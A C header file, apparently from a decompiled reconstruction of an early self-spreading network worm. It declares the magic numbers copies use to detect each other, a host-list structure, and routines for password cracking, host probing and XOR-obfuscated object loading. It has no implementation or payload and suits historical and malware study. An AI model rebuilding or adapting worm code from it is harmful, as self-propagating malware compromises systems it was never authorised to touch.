#pragma once

/* Magic numbers the program uses to identify other copies of itself. */

#define REPORT_PORT 0x2c5d
#define MAGIC_1 0x00148898
#define MAGIC_2 0x00874697
extern int pleasequit;		/* This stops the program after one
				 * complete pass if set.  It is incremented
				 * inside of checkother if contact with another
				 * happens. */

/* There are pieces of "stub" code, presumably from something like this to
   get rid of error messages */
#define error()

/* This appears to be a structure unique to this program.  It doesn't seem that
 * the blank slots are really an array of characters for the hostname, but
 * maybe they are.
 */
struct hst {
    char *hostname;
    int l4, l8, l12, l16, l20, l24, o28, o32, o36, o40, o44;
    int o48[6];					/* used */
    int flag;					/* used */
#define HST_HOSTEQUIV	8
#define HST_HOSTFOUR	4
#define HST_HOSTTWO	2
    struct hst *next;				/* o76 */
};

typedef struct {
    char *name;
    unsigned long size;
    char *buf;
} object;

extern struct ifses {
    int if_l0, if_l4, if_l8, if_l12; /* unused */
    int if_l16;			/* used */
    int if_l20;			/* unused */
    int if_l24;			/* used */
    short if_l28;		/* unused */
} ifs[];
extern int nifs;

extern int ngateways;

extern object objects[], *getobjectbyname();
extern int nobjects;

/* Only used for a2in().  Why?  I don't know. */
// struct bar {int baz;};
// extern struct bar *a2in();
struct in_addr *a2in();

char *XS(char *);
        
// net.c
int netmaskfor(int addr);
int def_netmask(int net_addr);
int if_init();
int rt_init();
void getaddrs(struct hst *host);

// hs.c
void h_clean();
int hg();
int ha();
int hl();
int hi();
int hi_84(int arg1);
int makemagic(struct hst *arg8, int *arg12, int *arg16, int *arg20, int *arg24);
int waithit(struct hst *host, int arg1, int arg2, int key, int arg4);
void justreturn(int sig);
void permute(int *ptr, int num, int size);
int hu1(char *alt_username, struct hst *host, char *username2);
int loadobject(char *obj_name);
object *getobjectbyname(char *name);
void xorbuf(char *buf, unsigned long size);
void checkother();
void other_sleep(int how_long);
int xread(int fd, char *buf, unsigned long length, int time);

// cracksome.c
void cracksome();
